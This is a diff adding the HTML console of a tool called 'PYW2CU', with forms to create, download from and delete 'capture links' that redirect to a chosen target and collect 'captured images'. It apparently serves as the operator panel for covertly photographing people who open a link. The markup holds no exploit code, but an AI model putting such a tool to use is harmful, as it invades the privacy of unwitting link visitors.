@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en-US">
+
+<head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>PYW2CU | console</title>
+    <style>
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <main class="contentarea">
+        <div>
+            Create capture link
+            <form action="/api/create" target="form">
+                <div>
+                    Link suffix:
+                    <span class="location"></span><input name="path" type="text" placeholder="...">
+                    <br>
+                    Link target:
+                    <input name="target" type="text" placeholder="https://example.com">
+                </div>
+                <input type="submit" value="Create">
+            </form>
+        </div>
+        <div>
+            Download captured images
+            <form action="/api/download" target="form">
+                <div>
+                    Link suffix:
+                    <span class="location"></span><input name="path" type="text" placeholder="...">
+                </div>
+                <input type="submit" value="Download">
+            </form>
+        </div>
+        <div>
+            Delete capture link
+            <form action="/api/delete" target="form">
+                <div>
+                    Link suffix:
+                    <span class="location"></span><input name="path" type="text" placeholder="...">
+                </div>
+                <input type="submit" value="Delete">
+            </form>
+        </div>
+    </main>
+
+    <iframe name="form" title="form" class="hidden"></iframe>
+
+    <script>
+        document.querySelectorAll('.location').forEach(el => el.textContent = location.host + '/')
+        document.getElementsByName('form')[0].addEventListener('load', (e) => {
+            console.log(1)
+            if (e.target.contentWindow.document.body.innerHTML) {
+                alert(e.target.contentWindow.document.body.innerHTML)
+            }
+        })
+    </script>
+</body>
+
+</html>
